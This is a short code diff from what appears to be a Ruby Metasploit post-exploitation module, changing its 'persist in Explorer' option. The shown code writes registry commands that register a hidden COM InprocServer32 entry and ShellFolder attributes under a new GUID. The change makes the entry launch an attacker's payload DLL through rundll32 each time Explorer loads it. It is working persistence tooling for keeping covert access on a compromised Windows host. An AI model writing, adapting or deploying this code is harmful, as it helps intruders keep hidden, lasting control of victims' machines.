@@ -247,13 +247,15 @@ def run
 
 
      #
-     # List of registry keys to add to target regedit ..
+     # List of registry keys to add to target regedit .. rundll32.exe $N4m.dll,main
      #
      if datastore['PERSIST_EXPLORER'] == true || datastore['RENAME_PERSIST'] == true
+       dll_exe = "rundll32.exe #{app_path},main"
        print_status("Persiste in Explorer selected ..")
+       print_warning("This option requires an payload.dll ..")
        Rex::sleep(1.0)
        hacks = [
-        '#{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d \"#{app_path}\" /f',
+        '#{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d \"#{dll_exe}\" /f',
         '#{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d /f',
         '#{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d \"Apartment\" /f',
         '#{hive_key}\\#{new_GUID}\\ShellFolder /v Attributes /t REG_DWORD /d \"0xf090013d\" /f',
